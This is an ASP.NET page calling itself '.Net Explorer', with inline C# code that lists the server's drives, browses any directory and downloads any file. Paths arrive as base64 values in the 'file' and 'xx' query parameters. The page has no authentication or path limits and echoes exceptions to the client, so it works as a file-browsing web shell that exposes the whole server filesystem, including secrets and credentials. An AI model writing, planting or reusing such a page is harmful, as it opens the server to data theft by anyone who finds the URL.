<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="explorer.aspx.cs" Inherits="WebUtils.explorer" %>

<%@ Import Namespace="System.IO" %>

<style type="text/css">
    .foldericon{
        background:'data:image/png;base64,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ECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK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'
    }
    .list-group-item{
        padding:0px !important;
    }
</style>

<script language="c#" runat="server">

    void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {

            if (Request.QueryString["file"] != null)
            {
                string filename = Request.QueryString["file"];
                string path = Encoding.Default.GetString( Convert.FromBase64String(filename));
                this.BindDirectories(path);
            }
            else if (Request.QueryString["xx"] != null)
            {
                string filename = Request.QueryString["xx"];
                string path = Encoding.Default.GetString( Convert.FromBase64String(filename));
                this.DownloadFile(path);
            }
            else
            {
                try{
                this.BindDrivers();

}
catch(Exception ex){
Response.Write(ex.ToString());
}
            }
        }
    }

    void DownloadFile(string filename)
    {
        
        FileInfo info = new FileInfo(filename);
        System.Web.HttpResponse response = System.Web.HttpContext.Current.Response;
            response.ClearContent();
            response.Clear();
            response.ContentType = "application/unknown";
            response.AddHeader("Content-Disposition", "attachment; filename=" + info.Name + ";");
            response.TransmitFile(filename);
            response.Flush();
            response.End();
    }

    void BindDrivers()
    {
        this.litUl.Text += "<ul class='list-group' >{0}</ul>";
        string[] drivers = Environment.GetLogicalDrives();
        string li = "";
        foreach (string d in drivers)
        {
            string b64 = Convert.ToBase64String(Encoding.Default.GetBytes(d));
            li += string.Format("<li class='list-group-item'><a href='{2}?file={0}'> {1}</a></li>", b64, d, Request.Url.ToString());

        }

        this.litUl.Text = string.Format(this.litUl.Text, li);
    }

    void BindDirectories(string basedirectory)
    {
        this.txtPath.Text = basedirectory;
        DirectoryInfo parentinfo =  Directory.GetParent(basedirectory);
        string b64;
        string li = string.Empty ;
        if (parentinfo != null)
        {
            b64 = Convert.ToBase64String(Encoding.Default.GetBytes(parentinfo.FullName));
            li =string.Format( "<li class='list-group-item list-group-item-action'><a href='{1}?file={0}'> ..</a></li>", b64, Request.Url.ToString());
        }

        this.litUl.Text += "<ul class='list-group' >{0}</ul>";
        string[] directories = Directory.GetDirectories(basedirectory);

        foreach (string d in directories)
        {
            DirectoryInfo dinfo = new DirectoryInfo(d);

            b64 = Convert.ToBase64String(Encoding.Default.GetBytes(d));

            li += string.Format("<li class='list-group-item list-group-item-action'><a href='{2}?file={0}'> {1}</a></li>", b64, dinfo.Name, Request.Url.ToString());

        }

        this.litUl.Text = string.Format(this.litUl.Text, li);
        this.BindFiles(basedirectory);
    }



    void BindFiles(string folder)
    {
        string[] files = Directory.GetFiles(folder, "*.*");
        string li = "";
        foreach (string s in files)
        {
            try
            {
                string b64 = Convert.ToBase64String(Encoding.Default.GetBytes(s));
                FileInfo fn = new FileInfo(s);
                li += string.Format("<li class='list-group-item'><a href='explorer.aspx?xx={0}'> {1}</a></li>", b64, fn.Name);

            }
            catch (Exception ex)
            {

            }

            this.litFiles.Text = li;
        }


    }

</script>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>.Net Explorer</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
</head>
<body>
    <form id="form1" runat="server">
        <div class="container">

            <div class="row">
                <div class="col-md-12">
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text" id="basic-addon1">
                               <img width="20" src="data:image/png;base64,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ECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK37/4AgCIFL9/8QUAECl+/+ILACBS/P7FFwBApPj9iy8AgEjx+xdfAACR4vcvvgAAIsXvX3wBAESK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" />
                                </span>
                        </div>
                        <asp:TextBox ID="txtPath" runat="server" CssClass="form-control" ></asp:TextBox>

                    </div>


                </div>

            </div>
            <div class="row">
                <div class="col-md-4" style="border: 1px; border-style: double">
                    
                    <asp:Literal ID="litUl" runat="server"></asp:Literal>
                    
                </div>
                <div class="col-md-8" style="border: 1px; border-style: double">
                    
                         <asp:Literal ID="litFiles" runat="server"></asp:Literal>
                    
                </div>
            </div>

        </div>

     
    </form>
</body>
</html>
